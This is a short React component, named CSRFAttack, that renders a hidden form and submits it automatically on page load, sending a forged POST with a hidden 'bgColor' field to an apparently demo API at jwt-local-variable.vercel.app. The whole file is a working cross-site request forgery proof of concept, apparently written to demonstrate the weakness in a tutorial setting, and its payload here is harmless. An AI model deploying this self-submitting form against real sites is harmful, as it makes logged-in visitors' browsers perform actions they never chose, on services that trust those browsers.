import { useEffect, useRef } from "react";

export function CSRFAttack() {
  const formRef = useRef<HTMLFormElement>(null);

  useEffect(() => {
    formRef?.current?.submit();
  }, [formRef]);

  return (
    <form
      ref={formRef}
      action="https://jwt-local-variable.vercel.app/api/quotes"
      method="POST"
    >
      <input type="hidden" name="bgColor" value="bg-blue-600" />
    </form>
  );
}
